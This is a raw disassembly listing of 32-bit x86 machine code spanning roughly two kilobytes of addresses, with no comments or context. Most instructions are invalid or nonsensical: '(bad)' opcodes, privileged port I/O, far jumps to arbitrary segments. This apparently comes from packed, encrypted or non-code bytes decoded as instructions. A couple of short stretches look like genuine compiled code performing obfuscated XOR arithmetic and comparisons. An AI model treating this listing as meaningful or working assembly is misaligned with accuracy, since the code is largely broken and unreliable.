  411a35:	adc    ch,BYTE PTR [eax-0x821dc3e]
  411a3b:	(bad)  
  411a3c:	out    dx,al
  411a3d:	scas   al,BYTE PTR es:[edi]
  411a3e:	jmp    DWORD PTR [ebx]
  411a40:	mov    cs,WORD PTR [edx+0x20cb8990]
  411a46:	xchg   edx,eax
  411a47:	mov    edi,0x41d2cc73
  411a4c:	test   al,0x67
  411a4e:	neg    DWORD PTR [esi+0x4a]
  411a51:	fwait
  411a52:	dec    ecx
  411a53:	mov    eax,0xf350b17e
  411a58:	mov    esi,0x7f6f3eb7
  411a5d:	stos   DWORD PTR es:[edi],eax
  411a5e:	rol    BYTE PTR [edi-0x33],cl
  411a61:	or     eax,DWORD PTR [ebx]
  411a63:	or     eax,0xbbe7f1ce
  411a68:	sbb    eax,DWORD PTR [ecx+ecx*8-0x77]
  411a6c:	mov    ebp,0xdebba21a
  411a71:	jp     0x411a11
  411a73:	push   cs
  411a74:	mov    eax,ds:0x388acc46
  411a79:	and    DWORD PTR [ebx-0x303ecf9e],esi
  411a7f:	ins    BYTE PTR es:[edi],dx
  411a80:	push   ebp
  411a81:	loopne 0x411aa5
  411a83:	pop    ecx
  411a84:	stos   BYTE PTR es:[edi],al
  411a85:	in     eax,dx
  411a86:	loop   0x411a0c
  411a88:	mov    ebp,0x513f20a8
  411a8d:	push   ss
  411a8e:	jbe    0x411a2b
  411a90:	(bad)  
  411a91:	outs   dx,BYTE PTR ds:[esi]
  411a92:	pusha  
  411a93:	lods   al,BYTE PTR ds:[esi]
  411a94:	xchg   ebx,eax
  411a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a96:	push   ds
  411a97:	mov    eax,0x59f022bf
  411a9c:	sbb    eax,0xf4066b1f
  411aa1:	jecxz  0x411a2b
  411aa3:	rcl    BYTE PTR [ebx+edi*2],cl
  411aa6:	xchg   ebp,eax
  411aa7:	fsub   QWORD PTR [eax]
  411aa9:	adc    ch,0x6b
  411aac:	mov    edx,0xad7a6f18
  411ab1:	mov    eax,ds:0xaf424862
  411ab6:	aam    0xe7
  411ab8:	inc    edx
  411ab9:	pop    esp
  411aba:	add    eax,0xaa9260c9
  411abf:	xor    esi,DWORD PTR [ecx]
  411ac1:	sti    
  411ac2:	jmp    0x54e0:0x918d7feb
  411ac9:	int3   
  411aca:	add    BYTE PTR [esi+0x393aae13],ah
  411ad0:	dec    ecx
  411ad1:	outs   dx,BYTE PTR ds:[esi]
  411ad2:	sub    al,al
  411ad4:	mov    ebp,0x34e97ea2
  411ad9:	test   DWORD PTR [edi],ebp
  411adb:	rcl    DWORD PTR [edx-0x33],0x25
  411adf:	xor    dh,BYTE PTR [ebx+0x2ed71c2e]
  411ae5:	mov    fs,ebx
  411ae7:	enter  0x34dd,0xfb
  411aeb:	sbb    DWORD PTR [eax+0x4e],edx
  411aee:	mov    BYTE PTR [esi-0x582cd8ab],bh
  411af4:	dec    edx
  411af5:	mov    esp,DWORD PTR [edx+0x26aede96]
  411afb:	test   BYTE PTR [edx+0x48ee0807],0x64
  411b02:	repnz stos BYTE PTR es:[edi],al
  411b04:	sahf   
  411b05:	ins    DWORD PTR es:[edi],dx
  411b06:	das    
  411b07:	jbe    0x411ab4
  411b09:	int3   
  411b0a:	jge    0x411b6e
  411b0c:	clc    
  411b0d:	ficomp DWORD PTR [edi-0xa]
  411b10:	lds    edi,FWORD PTR [ebp+0x45be5e7b]
  411b16:	or     eax,0xc6a8c19a
  411b1b:	enter  0x53e8,0x2e
  411b1f:	mov    edi,0x85d9e2c4
  411b24:	jbe    0x411adf
  411b26:	and    al,0x20
  411b28:	(bad)  
  411b29:	call   FWORD PTR [edi+0x12]
  411b2c:	std    
  411b2d:	inc    ecx
  411b2e:	daa    
  411b2f:	repz dec edx
  411b31:	data16 xor al,0x68
  411b34:	scas   al,BYTE PTR es:[edi]
  411b35:	hlt    
  411b36:	call   0x89c7:0x11f74dd9
  411b3d:	lahf   
  411b3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b3f:	ins    BYTE PTR es:[edi],dx
  411b40:	(bad)  
  411b41:	test   al,0x64
  411b43:	pop    ebx
  411b44:	ins    DWORD PTR es:[edi],dx
  411b45:	ds push esp
  411b47:	mov    edx,0x98ddc59
  411b4c:	test   DWORD PTR [ecx],ecx
  411b4e:	stc    
  411b4f:	stc    
  411b50:	fidivr WORD PTR [ebx]
  411b52:	shr    BYTE PTR [esi],cl
  411b54:	sub    al,0x47
  411b56:	cld    
  411b57:	mov    ds:0x42b2e8df,eax
  411b5c:	dec    DWORD PTR [ebp+0x5093d3fb]
  411b62:	xchg   ebp,eax
  411b63:	shl    BYTE PTR [ebp-0x5],1
  411b66:	mov    dl,0x12
  411b68:	nop
  411b69:	int3   
  411b6a:	pop    esp
  411b6b:	sub    al,0xcc
  411b6d:	dec    esi
  411b6e:	jb     0x411b81
  411b70:	and    al,0x9f
  411b72:	push   esp
  411b73:	data16 cmp al,0x3
  411b76:	jne    0x411b56
  411b78:	mov    es,WORD PTR [edx+0x4b7d08cf]
  411b7e:	pop    ss
  411b7f:	jl     0x411b90
  411b81:	repz push ss
  411b83:	sbb    al,BYTE PTR [ebx-0x62d25fff]
  411b89:	rcl    BYTE PTR [ecx],1
  411b8b:	pop    ebp
  411b8c:	dec    ecx
  411b8d:	and    eax,0x4044983e
  411b92:	call   0x4eaac962
  411b97:	jp     0x411bd1
  411b99:	fadd   DWORD PTR [eax]
  411b9b:	ret    0x4c79
  411b9e:	mov    eax,0x9c547b01
  411ba3:	pop    ebx
  411ba4:	iret   
  411ba5:	mov    eax,ds:0x63c1ef92
  411baa:	test   eax,0x6770d5a
  411baf:	test   dh,cl
  411bb1:	pop    edx
  411bb2:	mov    esi,0xc648f3d1
  411bb7:	aaa    
  411bb8:	push   ecx
  411bb9:	test   al,0xf5
  411bbb:	jns    0x411bcb
  411bbd:	mov    esp,0x7bc83fd5
  411bc2:	(bad)  
  411bc3:	mov    ah,0x63
  411bc5:	cmp    bh,0xfb
  411bc8:	fstp   DWORD PTR [eax]
  411bca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bcb:	loope  0x411bc6
  411bcd:	sbb    al,0xa5
  411bcf:	lahf   
  411bd0:	aad    0xde
  411bd2:	xchg   esi,eax
  411bd3:	ret    0xc2ae
  411bd6:	xor    bh,bl
  411bd8:	repnz dec ebp
  411bda:	dec    ebp
  411bdb:	push   0xfffffffc
  411bdd:	add    al,0x1b
  411bdf:	(bad)  
  411be0:	mov    ds:0x4e718bc9,eax
  411be5:	inc    esp
  411be6:	push   edx
  411be7:	or     al,0x9d
  411be9:	and    ch,BYTE PTR [esi]
  411beb:	dec    esp
  411bec:	iret   
  411bed:	sti    
  411bee:	inc    eax
  411bef:	inc    ebp
  411bf0:	mov    ch,BYTE PTR [esi+0x2e]
  411bf3:	lods   eax,DWORD PTR ds:[esi]
  411bf4:	les    esp,FWORD PTR [ecx+0x53]
  411bf7:	inc    edx
  411bf8:	scas   al,BYTE PTR es:[edi]
  411bf9:	int    0x2f
  411bfb:	push   eax
  411bfc:	push   eax
  411bfd:	dec    edx
  411bfe:	pop    ebx
  411bff:	or     al,0xed
  411c01:	or     esp,DWORD PTR [ebp-0x69]
  411c04:	in     eax,dx
  411c05:	mov    edi,0xe1126f37
  411c0a:	dec    esi
  411c0b:	out    0xe0,al
  411c0d:	cmp    BYTE PTR [ecx-0x6f541be1],bl
  411c13:	fwait
  411c14:	inc    ebx
  411c15:	mov    ds:0x77ccaca1,al
  411c1a:	ficom  WORD PTR [eax+0x5be6fd07]
  411c20:	jae    0x411c27
  411c22:	mov    esp,0xee5c4fd2
  411c27:	push   ax
  411c29:	xlat   BYTE PTR ds:[ebx]
  411c2a:	cli    
  411c2b:	push   0xf32aefcc
  411c30:	push   es
  411c31:	add    DWORD PTR [edx-0x48],0xd25149a8
  411c38:	mov    ds:0x65a811e0,al
  411c3d:	add    BYTE PTR [ebp+edi*4-0x1c],bl
  411c41:	sub    DWORD PTR [esi+0x33a62c5e],edx
  411c47:	call   0x9396341d
  411c4c:	imul   ebx,DWORD PTR [ebp+0x1ee50cfd],0x59bcfe0e
  411c56:	loope  0x411cb4
  411c58:	adc    BYTE PTR [ebp+0x44],ah
  411c5b:	cmp    bl,0x90
  411c5e:	fimul  DWORD PTR [ecx-0x3c3db75c]
  411c64:	sub    eax,0x5baf33c9
  411c69:	cli    
  411c6a:	aas    
  411c6b:	inc    eax
  411c6c:	mov    ecx,DWORD PTR [ebp-0x4c]
  411c6f:	mov    edx,DWORD PTR [ebp-0x60]
  411c72:	mov    esi,DWORD PTR [ebp-0x5c]
  411c75:	add    eax,0x7818
  411c7a:	adc    ecx,0x87
  411c80:	or     eax,edx
  411c82:	mov    edx,DWORD PTR [ebp-0x70]
  411c85:	jmp    0x411efa
  411c8a:	pop    ebp
  411c8b:	and    DWORD PTR [esi],esi
  411c8d:	xor    bh,BYTE PTR ds:[esi]
  411c90:	pop    ebp
  411c91:	sbb    bh,BYTE PTR [edi+edi*8-0x335695f8]
  411c98:	(bad)  
  411c99:	jl     0x411cea
  411c9b:	push   0x18
  411c9d:	sbb    BYTE PTR [ecx+0x14],dh
  411ca0:	sbb    BYTE PTR [eax],bl
  411ca2:	jg     0x411cb0
  411ca4:	fsub   st,st(0)
  411ca6:	scas   eax,DWORD PTR es:[edi]
  411ca7:	loopne 0x411cb0
  411ca9:	cmp    eax,esi
  411cab:	das    
  411cac:	fnstenv [edx-0x3231347c]
  411cb2:	sahf   
  411cb3:	add    eax,0xa59943ce
  411cb8:	cmp    DWORD PTR [eax+0x71fa9553],0x3b
  411cbf:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  411cc1:	push   esp
  411cc2:	dec    esp
  411cc3:	sbb    al,0x88
  411cc5:	test   al,0x58
  411cc7:	cmovg  edi,edi
  411cca:	out    0x26,eax
  411ccc:	addr16 xchg esp,eax
  411cce:	(bad)  
  411ccf:	call   0xa86cd6ea
  411cd4:	clc    
  411cd5:	fwait
  411cd6:	push   0x48
  411cd8:	pop    esi
  411cd9:	mov    edi,0x9c523a97
  411cde:	push   es
  411cdf:	or     eax,0xbef11c3e
  411ce4:	(bad)  
  411ce5:	setb   BYTE PTR [eax+0x27]
  411ce9:	das    
  411cea:	jecxz  0x411cab
  411cec:	xchg   ecx,eax
  411ced:	jge    0x411d15
  411cef:	retf   0x4645
  411cf2:	jmp    0x411ccb
  411cf4:	in     eax,0x21
  411cf6:	bound  ebx,QWORD PTR [edx-0x32757f52]
  411cfc:	jo     0x411cab
  411cfe:	(bad)  
  411cff:	xchg   ebp,eax
  411d00:	and    BYTE PTR [ebx+0x69],dl
  411d03:	hlt    
  411d04:	sub    dl,BYTE PTR [esi-0x34]
  411d07:	xchg   BYTE PTR [eax-0x72f36d2b],dl
  411d0d:	inc    eax
  411d0e:	call   0xcd43:0xdae8c442
  411d15:	pop    es
  411d16:	mov    bl,0x4f
  411d18:	push   ebx
  411d19:	in     al,0x4f
  411d1b:	(bad)  
  411d1c:	(bad)  
  411d1e:	sti    
  411d1f:	mov    eax,ds:0x8868fba2
  411d24:	xchg   BYTE PTR [esi+0xf],bl
  411d27:	mov    dh,dl
  411d29:	lock xchg ecx,eax
  411d2b:	pop    esp
  411d2c:	mov    ebp,0xb49e7539
  411d31:	and    al,0x72
  411d33:	jecxz  0x411ceb
  411d35:	scas   eax,DWORD PTR es:[edi]
  411d36:	mov    cl,cl
  411d38:	cwde   
  411d39:	(bad)  
  411d3a:	and    eax,0x592beb69
  411d3f:	dec    eax
  411d40:	call   0xd7a7:0x8edb5711
  411d47:	les    esp,FWORD PTR [ecx+0x6f]
  411d4a:	mov    ecx,0x705990c3
  411d4f:	sbb    bh,BYTE PTR [ecx]
  411d51:	lahf   
  411d52:	out    0x17,eax
  411d54:	imul   edx,DWORD PTR [ebx-0x32],0x100510d5
  411d5b:	pop    ebx
  411d5c:	pusha  
  411d5d:	mov    ds:0x57cb7e46,eax
  411d62:	pcmpeqw mm1,QWORD PTR [ecx-0x7e]
  411d66:	mov    BYTE PTR [ecx+ebp*2+0x2b6eb861],ah
  411d6d:	icebp  
  411d6e:	aas    
  411d6f:	imul   edi,DWORD PTR [edx],0x2c
  411d72:	xor    esi,DWORD PTR [ebx-0x717b685a]
  411d78:	cmp    edi,DWORD PTR [eax]
  411d7a:	fst    st(5)
  411d7c:	sbb    al,BYTE PTR ds:0xb5e09a99
  411d82:	arpl   WORD PTR [ecx-0x65aa1684],bx
  411d88:	adc    ah,BYTE PTR [eax-0x21]
  411d8b:	pop    eax
  411d8c:	sbb    bl,BYTE PTR [eax]
  411d8e:	xchg   BYTE PTR [esp+ebx*4],dl
  411d91:	sbb    al,0xd4
  411d93:	ror    DWORD PTR [esi+0x32cdf264],cl
  411d99:	inc    eax
  411d9a:	scas   al,BYTE PTR es:[edi]
  411d9b:	mov    dl,0xea
  411d9d:	out    dx,al
  411d9e:	mov    ds:0xef7aaf8a,eax
  411da3:	push   es
  411da4:	sbb    al,0x54
  411da6:	sub    edi,DWORD PTR [ecx]
  411da8:	add    dh,dh
  411daa:	mov    al,0x5b
  411dac:	inc    ebx
  411dad:	std    
  411dae:	scas   eax,DWORD PTR es:[edi]
  411daf:	ss stc 
  411db1:	add    DWORD PTR [esp+edi*8-0x28],ebp
  411db5:	mov    DWORD PTR [ebx],ebx
  411db7:	call   DWORD PTR [esi]
  411db9:	mov    ah,dh
  411dbb:	rcl    DWORD PTR [esi+0x7e2a4393],cl
  411dc1:	shr    edi,0x33
  411dc4:	loope  0x411d66
  411dc6:	adc    eax,0x9db83630
  411dcb:	and    BYTE PTR [eax+0x4fb10cbc],bh
  411dd1:	adc    eax,DWORD PTR [esi]
  411dd3:	out    dx,eax
  411dd4:	or     al,cl
  411dd6:	jge    0x411d62
  411dd8:	xlat   BYTE PTR ds:[ebx]
  411dd9:	es (bad) 
  411ddb:	pop    edi
  411ddc:	push   cs
  411ddd:	fcmove st,st(1)
  411ddf:	inc    ebp
  411de0:	jp     0x411def
  411de2:	push   0x6c4a1956
  411de7:	inc    esi
  411de8:	xor    bl,bh
  411dea:	push   ecx
  411deb:	xchg   ebx,eax
  411dec:	mov    ds:0x1f8113b7,eax
  411df1:	push   DWORD PTR [edi-0x3c]
  411df4:	(bad)  
  411df5:	push   edx
  411df6:	xlat   BYTE PTR ds:[ebx]
  411df7:	pop    edx
  411df8:	ins    BYTE PTR es:[edi],dx
  411df9:	add    al,0x1e
  411dfb:	sti    
  411dfc:	jmp    0x58d16992
  411e01:	call   0x38f4e7e0
  411e06:	jns    0x411da1
  411e08:	add    BYTE PTR [edx-0x7f],cl
  411e0b:	iret   
  411e0c:	mov    BYTE PTR [eax-0x80],bh
  411e0f:	lar    esp,WORD PTR [ebp-0x458caf71]
  411e16:	shl    eax,1
  411e18:	add    al,bh
  411e1a:	sahf   
  411e1b:	push   ebp
  411e1c:	xor    dl,al
  411e1e:	rol    BYTE PTR [edi-0x75f2ef60],0xbc
  411e25:	adc    DWORD PTR [esi+0x7a],eax
  411e28:	call   0xd110:0x245346
  411e2f:	fidivr WORD PTR [ebx]
  411e31:	pop    es
  411e32:	cmp    DWORD PTR [edx-0x52149750],edi
  411e38:	and    eax,0xd8cfbe98
  411e3d:	or     dl,BYTE PTR [ebx]
  411e3f:	adc    al,0x5e
  411e41:	jmp    0x8296:0x2d133ee0
  411e48:	inc    esi
  411e49:	mov    ebp,0x4b022031
  411e4e:	push   0x1bcbf660
  411e53:	jno    0x411dfb
  411e55:	stos   DWORD PTR es:[edi],eax
  411e56:	push   ebp
  411e57:	out    0x76,al
  411e59:	lock jae 0x411e30
  411e5c:	test   al,0x6e
  411e5e:	dec    ebx
  411e5f:	aad    0x36
  411e61:	stos   DWORD PTR es:[edi],eax
  411e62:	dec    esp
  411e63:	lea    eax,[edx-0x6974ad58]
  411e69:	ss in  al,dx
  411e6b:	(bad)  
  411e6c:	and    esi,ecx
  411e6e:	mov    edi,DWORD PTR [ebx+0x22]
  411e71:	test   al,0xb2
  411e73:	jnp    0x411e17
  411e75:	sbb    al,0xc4
  411e77:	loop   0x411eb1
  411e79:	sti    
  411e7a:	or     al,bh
  411e7c:	add    BYTE PTR [edx],bl
  411e7e:	sar    ebx,cl
  411e80:	out    dx,eax
  411e81:	lock in eax,0xc2
  411e84:	popa   
  411e85:	sbb    bh,BYTE PTR [ebx]
  411e87:	arpl   WORD PTR [edx+0x158a603a],ax
  411e8d:	push   edi
  411e8e:	inc    edx
  411e8f:	(bad)  
  411e91:	push   ebx
  411e92:	test   DWORD PTR [edx],0x6df87fd6
  411e98:	stos   DWORD PTR es:[edi],eax
  411e99:	push   edx
  411e9a:	in     eax,0x4d
  411e9c:	imul   ebx
  411e9e:	inc    esp
  411e9f:	mov    DWORD PTR [edi+0x4b9f95eb],edx
  411ea5:	adc    al,0xc1
  411ea7:	dec    edi
  411ea8:	rcl    DWORD PTR [ebx-0x65e79e7d],cl
  411eae:	leave  
  411eaf:	and    eax,0x75607d3
  411eb4:	xor    BYTE PTR [eax-0x22],ch
  411eb7:	xor    DWORD PTR ds:0x50d46279,ebx
  411ebd:	mov    ch,0xa7
  411ebf:	ins    BYTE PTR es:[edi],dx
  411ec0:	stc    
  411ec1:	push   ebx
  411ec2:	adc    ebx,DWORD PTR [esi]
  411ec4:	les    eax,FWORD PTR [ebx-0x22]
  411ec7:	bound  edx,QWORD PTR [ebp-0x471fa8ee]
  411ecd:	pop    ebp
  411ece:	out    0x41,al
  411ed0:	push   es
  411ed1:	rcl    BYTE PTR [ebx+edx*8-0x334c2997],1
  411ed8:	retf   
  411ed9:	xchg   DWORD PTR [ebx+0x47],edi
  411edc:	fdivr  st,st(2)
  411ede:	ins    DWORD PTR es:[edi],dx
  411edf:	or     eax,0x7f8a0b37
  411ee4:	pop    eax
  411ee5:	pop    edx
  411ee6:	in     eax,0x1a
  411ee8:	sahf   
  411ee9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411eea:	inc    edi
  411eeb:	push   ds
  411eec:	mov    esi,0x61394e3c
  411ef1:	hlt    
  411ef2:	sub    ecx,edi
  411ef4:	les    esp,FWORD PTR [ebp+edx*2-0x72]
  411ef8:	pop    ss
  411ef9:	ds or  ecx,esi
  411efc:	mov    esi,DWORD PTR [ebp-0x6c]
  411eff:	push   esi
  411f00:	push   edx
  411f01:	push   ecx
  411f02:	push   eax
  411f03:	call   0x416c20
  411f08:	mov    ecx,DWORD PTR [ebp-0x80]
  411f0b:	mov    esi,DWORD PTR [ebp-0x7c]
  411f0e:	and    eax,ecx
  411f10:	mov    ecx,DWORD PTR ds:0x4225b8
  411f16:	mov    ecx,DWORD PTR [ecx+0x1d0]
  411f1c:	mov    ecx,DWORD PTR [ecx]
  411f1e:	and    edx,esi
  411f20:	xor    eax,0x2b01
  411f25:	xor    edx,0x2021
  411f2b:	xor    esi,esi
  411f2d:	cmp    ecx,eax
  411f2f:	jne    0x4127da
  411f35:	cmp    esi,edx
  411f37:	jne    0x4127da
  411f3d:	mov    eax,DWORD PTR [ebp-0xa4]
  411f43:	mov    ecx,DWORD PTR [ebp-0xc]
  411f46:	add    eax,0x80ca
  411f4b:	or     eax,ecx
  411f4d:	mov    ecx,DWORD PTR ds:0x422654
  411f53:	or     eax,0x686
  411f58:	xor    eax,0x3eec
  411f5d:	lea    eax,[eax+ecx*1-0xc11b]
  411f64:	xor    DWORD PTR ds:0x42264c,eax
  411f6a:	mov    eax,DWORD PTR [ebp-0x64]
  411f6d:	and    eax,0x4dff
  411f72:	add    eax,DWORD PTR [ebp-0x14]
  411f75:	mov    ecx,DWORD PTR [ebp-0x94]
  411f7b:	xor    eax,0x676c
  411f80:	xor    edx,edx
  411f82:	div    ecx
  411f84:	mov    ecx,DWORD PTR [ebp-0x24]
  411f87:	mov    edx,DWORD PTR [ebp-0x74]
  411f8a:	xor    ecx,0x6e1e
  411f90:	imul   ecx,edx
  411f93:	mov    edx,DWORD PTR [ebp+0x8]
  411f96:	push   0x4
  411f98:	jmp    0x41220d
  411f9d:	mov    gs,WORD PTR [esp+ecx*4-0x7c]
  411fa1:	push   0x64
  411fa3:	jle    0x411fff
  411fa5:	inc    ebp
  411fa6:	inc    ecx
  411fa7:	jne    0x412025
  411fa9:	xchg   edi,eax
  411faa:	in     eax,0x47
  411fac:	push   0xffffffa6
  411fae:	data16 sbb BYTE PTR [eax],bl
  411fb1:	jno    0x411fc7
  411fb3:	sbb    BYTE PTR [eax],bl
  411fb5:	(bad)  
  411fb6:	sub    dl,ah
  411fb8:	sbb    ebx,DWORD PTR es:[edx+0x45ebf3b4]
  411fbf:	push   ecx
  411fc0:	xchg   edx,eax
  411fc1:	xor    dl,cl
  411fc3:	and    ch,bl
  411fc5:	aas    
  411fc6:	out    0x99,al
  411fc8:	shl    BYTE PTR [eax],0xbc
  411fcb:	dec    edx
  411fcc:	hlt    
  411fcd:	sub    al,0xad
  411fcf:	ret    0x594c
  411fd2:	stos   BYTE PTR es:[edi],al
  411fd3:	cmp    al,0xee
  411fd5:	push   ds
  411fd6:	xchg   esp,eax
  411fd7:	das    
  411fd8:	scas   eax,DWORD PTR es:[edi]
  411fd9:	push   ds
  411fda:	addr16 xchg esi,eax
  411fdc:	rol    DWORD PTR [ecx],0xe4
  411fdf:	dec    ebx
  411fe0:	push   edi
  411fe2:	ret    0xbc19
  411fe5:	jg     0x411f88
  411fe7:	add    eax,0xdfd1116
  411fec:	pop    ebx
  411fed:	ss and al,0x35
  411ff0:	sti    
  411ff1:	jno    0x411fc8
  411ff3:	mov    cs,WORD PTR [ecx+0x1e]
  411ff6:	cmp    esi,0xffffffa8
  411ff9:	xchg   esp,eax
  411ffa:	outs   dx,DWORD PTR ds:[esi]
  411ffb:	jge    0x412012
  411ffd:	sbb    DWORD PTR [eax+0x1c],esp
  412000:	and    al,0x1
  412002:	stos   DWORD PTR es:[edi],eax
  412003:	(bad)  
  412004:	jmp    0x2a85:0x2835903
  41200b:	std    
  41200c:	pop    ecx
  41200d:	pop    ds
  41200e:	bound  edi,QWORD PTR [ebx-0x50c4fa50]
  412014:	pop    edx
  412015:	fld    DWORD PTR [ebx+edi*2+0x11b7ee0c]
  41201c:	mov    bh,0x7c
  41201e:	jns    0x411fc9
  412020:	jb     0x412029
  412022:	aaa    
  412023:	pop    ecx
  412024:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412025:	aad    0xff
  412027:	mov    ebp,0x58ec3dfb
  41202c:	mov    ebp,0xa558499a
  412031:	pop    ecx
  412032:	jno    0x41203c
  412034:	mov    esp,0x16d75f61
  412039:	cmp    al,0x1c
  41203b:	lds    edi,FWORD PTR [ecx]
  41203d:	and    DWORD PTR [ebx+0x2b1e1ba3],edx
  412043:	sbb    ch,BYTE PTR [ebp+edx*8-0x4d]
  412047:	add    al,0xdd
  412049:	jg     0x412006
  41204b:	pop    ecx
  41204c:	inc    esp
  41204d:	fisttp DWORD PTR [ebx-0x3221f9c4]
  412053:	jmp    0x5e8b391f
  412058:	push   0xbff75e53
  41205d:	enter  0x4515,0x50
  412061:	and    al,BYTE PTR [edi-0x73193b3]
  412067:	mov    dh,0xde
  412069:	inc    edx
  41206a:	test   DWORD PTR [ebp-0x22],edx
  41206d:	fsubrp st(2),st
  41206f:	iret   
  412070:	test   esp,0xc0ad470
  412076:	out    0x66,al
  412078:	xchg   ecx,eax
  412079:	lods   eax,DWORD PTR ds:[esi]
  41207a:	ret    
  41207b:	mov    ah,0x67
  41207d:	dec    edx
  41207e:	jns    0x412011
  412080:	inc    esp
  412081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412082:	lods   al,BYTE PTR ds:[esi]
  412083:	nop
  412084:	fwait
  412085:	mov    esi,0x8e555b0a
  41208a:	fwait
  41208b:	je     0x4120a4
  41208d:	push   ebp
  41208e:	mov    dh,0xe2
  412090:	dec    eax
  412091:	mov    ebx,0xf3d45ba3
  412096:	sbb    eax,0xd41207a2
  41209c:	xor    eax,0x307d5030
  4120a1:	test   ebp,edx
  4120a3:	cmc    
  4120a4:	xchg   esi,eax
  4120a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120a6:	ds ss iret 
  4120a9:	fs mov bh,0x28
  4120ac:	or     al,0x2d
  4120ae:	add    al,0xca
  4120b0:	and    al,0x6e
  4120b2:	pop    ss
  4120b3:	xor    al,0x17
  4120b5:	fs xor al,0x25
  4120b8:	js     0x4120e3
  4120ba:	pop    edi
  4120bb:	cs ins BYTE PTR es:[edi],dx
  4120bd:	add    cl,BYTE PTR [esi+0x420450d8]
  4120c3:	ucomiss xmm3,DWORD PTR [ebx]
  4120c6:	stc    
  4120c7:	mov    edi,0xce32be03
  4120cc:	fwait
  4120cd:	lods   al,BYTE PTR ds:[esi]
  4120ce:	sub    DWORD PTR [ebx+0x25],0x9c81970
  4120d5:	pop    ss
  4120d6:	dec    eax
  4120d7:	fadd   st(7),st
  4120d9:	push   ecx
  4120db:	sbb    BYTE PTR [ebp-0x16],ah
  4120de:	rep ins DWORD PTR es:[edi],dx
  4120e0:	sub    ch,dl
  4120e2:	inc    edx
  4120e3:	pop    edi
  4120e4:	rcr    BYTE PTR [ebx],1
  4120e6:	sbb    ecx,DWORD PTR [eax]
  4120e8:	into   
  4120e9:	cs cmp eax,0x215d76e4
  4120ef:	leave  
  4120f0:	test   DWORD PTR [edx-0x1b],edi
  4120f3:	in     eax,0xda
  4120f5:	mov    eax,0xb12901b
  4120fa:	(bad)  
  4120fb:	ficomp DWORD PTR [ebx]
  4120fd:	cs js  0x412144
  412100:	adc    edx,DWORD PTR [ecx+0x6c]
  412103:	mov    eax,ds:0x4727e43e
  412108:	pushf  
  412109:	sbb    bl,dh
  41210b:	pop    esi
  41210c:	das    
  41210d:	mov    DWORD PTR [edi],esp
  41210f:	lds    edi,FWORD PTR [ecx]
  412111:	in     al,dx
  412112:	xor    DWORD PTR [ebp-0x267c2f23],0x32f3f178
  41211c:	pop    es
  41211d:	adc    al,BYTE PTR [edi]
  41211f:	test   DWORD PTR [edi+0x416a8957],ecx
  412125:	jp     0x4120d6
  412127:	js     0x412160
  412129:	cdq    
  41212a:	cli    
  41212b:	lahf   
  41212c:	mov    ebp,DWORD PTR [edx-0x38]
  41212f:	ins    DWORD PTR es:[edi],dx
  412130:	mov    al,BYTE PTR [edx-0x7d]
  412133:	jbe    0x412157
  412135:	xlat   BYTE PTR ds:[ebx]
  412136:	cmp    edx,DWORD PTR [ecx+0x41d14582]
  41213c:	jb     0x4120f0
  41213e:	mov    esp,0x32e325c0
  412143:	ins    DWORD PTR es:[edi],dx
  412144:	xchg   DWORD PTR [edi],edi
  412146:	mov    esi,0x16f94d17
  41214b:	ret    0x89c9
  41214e:	stos   DWORD PTR es:[edi],eax
  41214f:	inc    edi
  412150:	sub    dh,BYTE PTR [ecx+0x10]
  412153:	bound  edi,QWORD PTR [ecx-0x155c0b2e]
  412159:	push   0x10
  41215b:	in     eax,0x46
  41215d:	push   0x7c
  41215f:	and    edx,DWORD PTR [eax-0x27]
  412162:	cmp    edx,DWORD PTR [ebx+ecx*2+0x344903ef]
  412169:	aas    
  41216a:	jbe    0x41217e
  41216c:	jae    0x4121ad
  41216e:	stos   DWORD PTR es:[edi],eax
  41216f:	mov    dh,0xef
  412171:	fisubr DWORD PTR [edi+0x69b92023]
  412177:	mov    ebx,0x4a8c60b7
  41217c:	mov    ch,0xa9
  41217e:	xor    al,0x7d
  412180:	lods   al,BYTE PTR ds:[esi]
  412181:	add    BYTE PTR [edi],dh
  412183:	or     eax,0x3db24b0a
  412188:	call   0xaaef5aac
  41218d:	sahf   
  41218e:	fs cwde 
  412190:	retf   0x11ec
  412193:	or     DWORD PTR [edi-0x592d5f19],ebp
  412199:	push   ss
  41219a:	jb     0x412214
  41219c:	dec    ecx
  41219d:	jmp    0xaada7d7d
  4121a2:	add    DWORD PTR [ebp-0x3e58f075],edi
  4121a8:	xlat   BYTE PTR ds:[ebx]
  4121aa:	loopne 0x412225
  4121ac:	or     al,al
  4121ae:	xchg   esp,eax
  4121af:	mov    al,ds:0x91df7201
  4121b4:	int    0xb0
  4121b6:	or     BYTE PTR [ebp+edi*4+0x1d],bl
  4121ba:	out    dx,al
  4121bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121bc:	addr16 std 
  4121be:	stos   BYTE PTR es:[edi],al
  4121bf:	jl     0x41217f
  4121c1:	mov    WORD PTR [ecx+0x1cae9265],?
  4121c7:	or     BYTE PTR [ebp+0x3585c7df],0x8c
  4121ce:	ret    0x8372
  4121d1:	jae    0x4121e5
  4121d3:	mov    gs,ecx
  4121d5:	xchg   esi,eax
  4121d6:	mov    edi,0x6782691b
  4121db:	out    0x51,eax
  4121dd:	xor    eax,DWORD PTR [edi]
  4121df:	fwait
  4121e0:	ja     0x4121d0
  4121e2:	pushf  
  4121e3:	mov    ebx,0x235c8a6e
  4121e8:	icebp  
  4121e9:	pushf  
  4121ea:	mov    ebp,0x8a1b0a7b
  4121ef:	dec    ebp
  4121f0:	push   0x2f02b99d
  4121f5:	adc    dl,BYTE PTR [ebx+0x4c]
  4121f8:	pop    eax
  4121f9:	inc    esi
  4121fa:	mov    eax,ss
  4121fc:	cmp    eax,0x70bb4792
  412201:	je     0x412208
  412203:	jl     0x412217
  412205:	enter  0x579e,0xc7
  412209:	jecxz  0x412236
  41220b:	lods   al,BYTE PTR ds:[esi]
  41220c:	inc    edi
  41220d:	push   0xe4c37b20
  412212:	xor    eax,0x3884
  412217:	mov    eax,DWORD PTR [eax+edx*1]
  41221a:	lea    ecx,[eax+ecx*1-0x27c6df8a]
